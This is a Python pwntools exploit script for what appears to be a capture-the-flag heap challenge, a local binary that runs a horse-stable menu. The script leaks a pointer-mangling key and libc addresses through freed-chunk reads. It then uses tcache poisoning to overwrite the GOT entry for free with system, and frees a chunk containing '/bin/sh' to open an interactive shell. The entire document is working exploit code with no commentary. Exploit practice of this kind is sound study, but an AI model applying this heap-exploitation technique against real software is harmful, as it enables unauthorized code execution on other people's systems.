from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def choice(id_):
    p.recvuntil(b'Choice:')
    p.sendline(id_)


def change(id_, mess, spot):
    choice(b'0')
    p.recvuntil(b'Stable index # (0-17)?')
    p.sendline(id_)
    p.recvuntil(b'characters:')
    p.sendline(mess)
    p.recvuntil(b'New spot?')
    p.sendline(spot)


def add(id_, size_, mess):
    choice(b'1')
    p.recvuntil(b'Stable index # (0-17)?')
    p.sendline(id_)
    p.recvuntil(b'Horse name length (16-256)?')
    p.sendline(size_)
    p.recvuntil(b'characters:')
    p.sendline(mess)


def delete(id_):
    choice(b'2')
    p.recvuntil(b'Stable index # (0-17)?')
    p.sendline(id_)


[add(str(i), b'23', b'a' * 23) for i in range(0, 5)]
delete(b'0')
add(b'17', b'23', b'\xff')
choice(b'3')
p.recvuntil(b'WINNER: ')
key = u16(p.recv(2))
print(hex(key))
delete(b'17')
add(b'0', b'23', b'a' * 23)
[add(str(i), b'128', str(i) * 128) for i in range(5, 13)]
add(b'13', b'16', b'\xff')
[delete(str(i)) for i in range(5, 13)]
add(b'17', b'32', b'\xff')
choice(b'3')
main_area = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00')) - 224
free_addr = main_area - (0x7fa420784c80 - 0x7fa420610460)
offset = 0xc0f460 - 0xdbbd30
fake_addr = free_addr - offset
libc_base = free_addr - lib.sym['free']
system_addr = libc_base + lib.sym['system']
puts_addr = libc_base + lib.sym['puts']
p.recvuntil(b'WINNER')
print(hex(libc_base))
add(b'14', b'24', b'a' * 31)
add(b'15', b'24', b'a' * 31)
delete(b'14')
delete(b'15')
free_got = elf.got['free'] - 0x8
payload = p64(free_got ^ key) + p64(0)
change(b'15', payload, b'16')
add(b'14', b'24', b'a' * 24)
payload = p64(fake_addr) + p64(system_addr) + p64(puts_addr)
add(b'15', b'24', payload)
payload = b'/bin/sh\00' + b'\xff'
add(b'16', b'16', payload)
delete(b'16')
# gdb.attach(p)
p.interactive()
